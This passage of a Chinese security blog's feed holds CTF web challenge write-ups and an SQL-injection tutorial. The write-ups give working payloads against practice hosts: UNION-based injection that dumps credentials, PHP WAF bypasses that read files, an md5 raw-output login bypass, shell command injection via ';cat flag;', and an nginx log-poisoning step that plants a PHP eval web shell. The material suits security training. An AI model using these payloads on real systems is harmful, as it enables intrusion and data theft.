number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：</p><blockquote><p>Hello b4bsql,geekuser！<br>Your password is ‘geek’</p></blockquote><p>6&gt;查字段</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>返回</p><p><code>Hello id,username,password！</code></p><p><code>Your password is &#39;geek&#39;</code></p></blockquote><p>7&gt;查值</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(id,username,passwoorrd) frofromm b4bsql),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>返回：</p><p><code>flag&#123;fdbfc75c-253c-482b-8867-dfd6f0dd92e6&#125;！</code></p></blockquote><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><blockquote><p>判断注入点后，常规查询，发现部分关键字被绕过</p></blockquote><h1 id="14、-RoarCTF-2019-Easy-Calc"><a href="#14、-RoarCTF-2019-Easy-Calc" class="headerlink" title="14、[RoarCTF 2019]Easy Calc"></a>14、[RoarCTF 2019]Easy Calc</h1><blockquote><p>没有思路</p></blockquote><p>查询了解到有两个方法</p><blockquote><ol><li>利用php对字符串的处理特性绕过waf</li><li>Http走私</li></ol></blockquote><h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><blockquote><p>进行绕waf，首先了解一下php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p></blockquote><blockquote><blockquote><p>构造payload来查看目录，用chr转化成ascll码进行绕过</p></blockquote></blockquote><p>payload1：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(scandir(chr(47)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1array(24) &#123;  [0]=&gt;  string(1) &quot;.&quot;  [1]=&gt;  string(2) &quot;..&quot;  [2]=&gt;  string(10) &quot;.dockerenv&quot;  [3]=&gt;  string(3) &quot;bin&quot;  [4]=&gt;  string(4) &quot;boot&quot;  [5]=&gt;  string(3) &quot;dev&quot;  [6]=&gt;  string(3) &quot;etc&quot;  [7]=&gt;  string(5) &quot;f1agg&quot;  [8]=&gt;  string(4) &quot;home&quot;  [9]=&gt;  string(3) &quot;lib&quot;  [10]=&gt;  string(5) &quot;lib64&quot;  [11]=&gt;  string(5) &quot;media&quot;  [12]=&gt;  string(3) &quot;mnt&quot;  [13]=&gt;  string(3) &quot;opt&quot;  [14]=&gt;  string(4) &quot;proc&quot;  [15]=&gt;  string(4) &quot;root&quot;  [16]=&gt;  string(3) &quot;run&quot;  [17]=&gt;  string(4) &quot;sbin&quot;  [18]=&gt;  string(3) &quot;srv&quot;  [19]=&gt;  string(8) &quot;start.sh&quot;  [20]=&gt;  string(3) &quot;sys&quot;  [21]=&gt;  string(3) &quot;tmp&quot;  [22]=&gt;  string(3) &quot;usr&quot;  [23]=&gt;  string(3) &quot;var&quot; &#125;</code></p></blockquote><p>payload2：查看flag内容</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1string(43) &quot;flag&#123;5392e731-b3c2-45d6-9326-976c11b3c2b0&#125; &quot;</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf.show_web9</title>
      <link href="/2022/04/14/ctf.show_web9/"/>
      <url>/2022/04/14/ctf.show_web9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><blockquote><p> 登录界面，想到了sql注入，试一下万能密码，不行</p></blockquote></blockquote><p>`猜测可能有其他页面</p><p>法一：</p><blockquote><p><strong>直接后台目录扫描，发现index.phps源代码文件</strong></p></blockquote><p>法二：</p><blockquote><p>robots.txt中查看被隐藏不允许访问的页面</p><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: &#x2F;index.phps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="index-phps代码"><a href="#index-phps代码" class="headerlink" title="index.phps代码"></a>index.phps代码</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username ='admin' and password ='"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关键代码解释："><a href="#关键代码解释：" class="headerlink" title="关键代码解释："></a>关键代码解释：</h2><blockquote><ol><li><p>  PHP strlen() 函数：函数返回字符串 “Shanghai” 的长度；</p></li><li><p>mysqli_query() 函数执行某个针对数据库的查询&lt;查询成功将返回一个 mysqli_result 对象或 TRUE。如果失败，则返回 FALSE&gt;</p></li><li><p>md5() 函数计算字符串的 MD5 散列—–&gt; <center><u>md5(<em>string,raw</em>)<u/><center/></p></li><li><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table></li><li><p>PHP mysqli_num_rows()：获取查询结果的行数</p></li><li><p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组<br> ==得出结论：==<br> 要得到flag需要向password传参，并且传参结果需要经过md5加密后通过sql语句验证，也就是可以理解为使用md5进行绕过</p></li></ol></blockquote><h1 id="php-md5-漏洞"><a href="#php-md5-漏洞" class="headerlink" title="php md5()漏洞"></a>php md5()漏洞</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"> 这里涉及到了一个<span class="token constant">PHP</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span>漏洞即：php中的md5函数有一个可选参数，如果开发者写查询数据库函数时使用了这个参数，或者在数据存储时是md5后的字符串形式存储，都有可能产生这个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre class="line-numbers language-none"><code class="language-none">md5(string,raw)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table></blockquote><p>md5看似是非常强<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>措施，但是一旦没有返回我们常见的16进制数，返回了二进制原始输出格式，在浏览器编码的作用下就会编码成为奇怪的字符串（对于二进制一般都会编码）。</p><p>我们使用md5碰撞，一旦在这些奇怪的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>中碰撞出了可以进行SQL注入的特殊字符串，那么就可以越过登录了</p><p>在经过长时间的碰撞后，比较常用的是以下两种：<br>数字型：<code>129581926211651571912466741651878684928</code><br>字符型：<code>ffifdyop</code></p><blockquote><p>可以使用以下代码验证：</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'ffifdyop'</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'129581926211651571912466741651878684928'</span><span class="token punctuation">;</span>    <span class="token variable">$bb</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$bb</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token variable">$cc</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$cc</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or'</span><span class="token number">6</span>�<span class="token punctuation">]</span>��<span class="token operator">!</span>r<span class="token punctuation">,</span>��b�<span class="token constant">T0D</span>��o<span class="token comment">#��'or'8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到，它们都有==<strong>‘or’</strong>==结构<br>就可以构造出**<u>必真</u>**的结果。</p><h1 id="最终结果："><a href="#最终结果：" class="headerlink" title="最终结果："></a>最终结果：</h1><p><code>strlen($password)&gt;10</code>要求字符串长度小于10，因此选择<code>ffifdyop</code></p><p>使用bp进行抓包改包，向password传参</p><p>得到flag</p><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">总结ctf中 MD5 绕过的一些思路</a> 总结ctf中 MD5 绕过的一些思路_yจุ๊บng的博客-CSDN博客_ctf md5绕过](<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a>))</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web_萌新赛签到题</title>
      <link href="/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
      <url>/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl https://"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".ctf.show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看得出关键处是==system()==中的内容，此处去了解下</p><h1 id="PHP-命令执行漏洞"><a href="#PHP-命令执行漏洞" class="headerlink" title="PHP 命令执行漏洞"></a>PHP 命令执行漏洞</h1><blockquote><p>应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。</p><p>当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞，这就是命令执行漏洞。</p></blockquote><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">PHP的命令执行漏洞学习</a> PHP的命令执行漏洞学习_笑花大王的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43818995/article/details/104164684))%EF%BC%9A%EF%BC%88win%E4%B8%8Elinux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%AE%A1%E9%81%93%E7%AC%A6%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%89">https://blog.csdn.net/weixin_43818995/article/details/104164684))：（win与linux系统下管道符的功能）</a></p><p>[ctfweb命令执行](<a href="https://www.cnblogs.com/NPFS/p/13797436.html">CTFshow web入门 (命令执行） - NPFS - 博客园 (cnblogs.com)</a>)</p><blockquote><p>system解释：</p><p>php函数system详解： 执行外部程序并显示输出资料。 system语法: string system(string command, int [return_var]); system返回值: 字符串 函数种类: 操作系统与环境 system内容说明 本函数就像是 C 语中的函数 system()，用来执行指令，并输出结果。</p></blockquote><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p><strong>有两种方式</strong>（linux下url命令传参）</p><p>一：</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;127.0.0.1;cat flag;该命令直接猜测查看flag文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>二：</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;ls;该命令显示结果为：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>flag index.php </p></blockquote><p>继续访问flag文件</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;cat flag;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfShow7_8</title>
      <link href="/2022/04/08/ctfShow-web-7-8/"/>
      <url>/2022/04/08/ctfShow-web-7-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctf-show-web7"><a href="#ctf-show-web7" class="headerlink" title="ctf.show_web7"></a>ctf.show_web7</h1><blockquote><p>点开题目中列表，没有发现有价值的信息</p><p>但是URL中出现了**<u>?id=</u>**字样，可能是sql注入</p></blockquote><p><code>http://579975c2-c8b2-48a7-955a-efc4b38455a6.challenge.ctf.show/?id=1</code></p><h2 id="简单判断有无注入点"><a href="#简单判断有无注入点" class="headerlink" title="简单判断有无注入点"></a>简单判断有无注入点</h2><p><code>id=1&#39;</code> 单引号判断（可能因为单引号不匹配而报错）</p><blockquote><p>/index.php?id=1’ #</p><p>不报错</p></blockquote><h2 id="尝试后发现-空格-被过滤"><a href="#尝试后发现-空格-被过滤" class="headerlink" title="尝试后发现==空格==被过滤"></a>尝试后发现==空格==被过滤</h2><p>使用==//==或==/**/==绕过过滤</p><table><thead><tr><th align="left">爆显示位</th><th>?id=1%27/<strong>/or/</strong>/1=1/<strong>/union/</strong>/select/**/1,2,3#</th></tr></thead><tbody><tr><td align="left">爆表</td><td>？id=1/<strong>/union/</strong>/select/<strong>/1,group_concat(table_name),3/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_schema=database()#</td></tr><tr><td align="left">爆字段</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,group_concat(column_name),3/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=”flag”#</td></tr><tr><td align="left">爆值</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,flag,3/</strong>/from/**/flag#</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入点判断</title>
      <link href="/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/"/>
      <url>/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单判断是否存在SQL注入"><a href="#简单判断是否存在SQL注入" class="headerlink" title="简单判断是否存在SQL注入"></a>简单判断是否存在SQL注入</h1><h2 id="单引号判断"><a href="#单引号判断" class="headerlink" title="单引号判断"></a><strong>单引号判断</strong></h2><p><strong>$id参数左右有数字型（无）、单引号、双引号、括号等方式组成闭合；</strong></p><p>最为经典的==单引号判断法：==在参数后面加上单引号’比如:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">　http:<span class="token comment">//xxx/abc.php?id=1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为</p><blockquote><p><strong>单引号个数不匹配</strong></p></blockquote><p>而报错。</p><h2 id="万能语句："><a href="#万能语句：" class="headerlink" title="万能语句："></a>万能语句：</h2><p>如果我们传入的 username 为 1’ or 1=1 #，随意输入 password，那么传入后端验证时，sql语句就是</p><blockquote><p><strong><strong>*%23为#注释符的url编码*</strong></strong></p></blockquote><pre><code>select * from table_name where username=&#39;1&#39; or 1=1 # &#39; and password=&#39;xxxxxx&#39;</code></pre><h1 id="通常-Sql-注入漏洞分为-2-种类型："><a href="#通常-Sql-注入漏洞分为-2-种类型：" class="headerlink" title="通常 Sql 注入漏洞分为 2 种类型："></a>通常 <u>Sql</u> 注入漏洞分为 2 种类型：</h1><blockquote><p>　　<strong>数字型</strong></p><p>　　<strong>字符型</strong></p></blockquote><h2 id="数字型判断："><a href="#数字型判断：" class="headerlink" title="数字型判断："></a>数字型判断：</h2><p>　　当输入的参 x 为整型时，通常 123.php 中 Sql 语句类型大致如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">select <span class="token operator">*</span> from <span class="token operator">&lt;</span>表名<span class="token operator">></span> where id <span class="token operator">=</span> x     这种类型可以使用经典的 <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> 和 <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> 来判断：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>　　Url 地址中输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x <strong>and 1=1</strong> 页面依旧运行正常，继续进行下一步。(说明sql语句执行了，语句语法及逻辑判断正确，因此不报错)</p></blockquote><p>　　Url 地址中<u><strong>继续</strong></u>输入 </p><p><code>http://xxx/abc.php?id= x **and 1=2**</code> </p><p>页面运行错误，则说明此 Sql 注入为数字型注入。</p><h3 id="语句解释"><a href="#语句解释" class="headerlink" title="语句解释"></a>语句解释</h3><p>当输入 and 1=1时，后台执行 Sql 语句：</p><p>　　<code>select * from &lt;表名&gt; where id = x and 1=1</code></p><p>　　当输入 and 1=2时，后台执行 Sql 语句：</p><p>　　select * from &lt;表名&gt; where id = x and 1=2</p><p>　　没有语法错误但是逻辑判断为假，所以返回错误。 </p><p>我们再使用==假设法：==如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</p><p>　　<code>select * from &lt;表名&gt; where id = &#39;x **and 1=1**&#39; select * from &lt;表名&gt; where id = &#39;x **and 1=2**&#39;</code></p><p>　　查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p><h2 id="字符型判断："><a href="#字符型判断：" class="headerlink" title="字符型判断："></a>字符型判断：</h2><p>　　当输入的参 x 为字符型时，通常 123.php 中 SQL 语句类型大致如下： select * from &lt;表名&gt; where id = <strong>‘x’</strong> 这种类型我们同样可以使用 <strong>and ‘1’=’1</strong> 和 <strong>and ‘1’=’2</strong>来判断：</p><p>　　<code>Url 地址中输入 http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;1**</code> </p><p>页面运行正常，继续进行下一步。</p><p>　　<code>Url 地址中继续输入 http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;2**</code> </p><p>页面运行错误，则说明此 Sql 注入为字符型注入。</p><h3 id="语句解释-1"><a href="#语句解释-1" class="headerlink" title="语句解释"></a>语句解释</h3><blockquote><p>‘ 的作用是使语句闭合，否则整个语句将被当作字符串处理</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo-blog搭建问题汇总</title>
      <link href="/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-hexo-d命令时提示输入账号和密码"><a href="#1-hexo-d命令时提示输入账号和密码" class="headerlink" title="1.hexo d命令时提示输入账号和密码"></a>1.hexo d命令时提示输入账号和密码</h1><p>问题起源来自一次hexo d的命令部署失败（从blog搭建开始那天，只要选择远端部署，报错就没消停过）<br>hexo d后一直报错，提示无法连接github，于是修改了ssh，重新配置了_config.yml中的deploy：repo: <a href="https://github.com/KanNiKanYun/KanNiKanYun.github.io">https://github.com/KanNiKanYun/KanNiKanYun.github.io</a><br>但是依旧没能解决问题：无法部署远端</p><h2 id="于是继续查询解决方案"><a href="#于是继续查询解决方案" class="headerlink" title="于是继续查询解决方案 "></a><strong>于是继续查询解决方案</strong> </h2><p><a href="https://blog.csdn.net/hhgggggg/article/details/77853665">https://blog.csdn.net/hhgggggg/article/details/77853665</a><br>解决参考链接如上<br>关键步骤：<br>配置rope为repo: <a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;</a>:<strong><u>kannikanyun/kannikanyun</u></strong>.github.io.git</p><h2 id="gitee图床失效后的新的选择方式"><a href="#gitee图床失效后的新的选择方式" class="headerlink" title="gitee图床失效后的新的选择方式"></a>gitee图床失效后的新的选择方式</h2><p><a href="https://blog.csdn.net/rong09_13/article/details/123885104?ops_request_misc=%7B%22request_id%22:%22164897506216780255258485%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164897506216780255258485&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123885104.142%5Ev5%5Epc_search_insert_es_download,157%5Ev4%5Enew_style&utm_term=gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E8%83%BD&spm=1018.2226.3001.4187">具体参考配置</a></p><p>概括：使用github仓库作为图床</p><h3 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h3><p>1.上传速度慢</p><p>2.需要一段时间后更换仓库，以免占用空间过大被检测</p>]]></content>
      
      
      
        <tags>
            
            <tag> HEXO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfShow-web-4-6</title>
      <link href="/2022/04/01/ctfShow-web-4-6/"/>
      <url>/2022/04/01/ctfShow-web-4-6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="4-ctf-show-web4"><a href="#4-ctf-show-web4" class="headerlink" title="4.ctf.show_web4"></a>4.ctf.show_web4</h1><p>题目描述和web3是一样的，但是3的方法已经不行了，没有思路，看提示</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051792.png"></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">/etc/passwd依旧可以访问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">文件包含  日志注入<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><u>请求头中可以看出，服务器是<strong>nginx</strong></u></p><p>nginx的log在</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>access.log允许打开</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;6339ac54-c058-4ed2-a21d-5fe884f66c63.challenge.ctf.show&#x2F;?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051635.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">在UA中添加<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>防止url编码</p><p>使用蚁剑成功连接</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051517.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051563.png"></p><p><a href="%5B(66%E6%9D%A1%E6%B6%88%E6%81%AF">refer to</a> CTF show WEB 1-4_yu22x的博客-CSDN博客_ctfshow web](<a 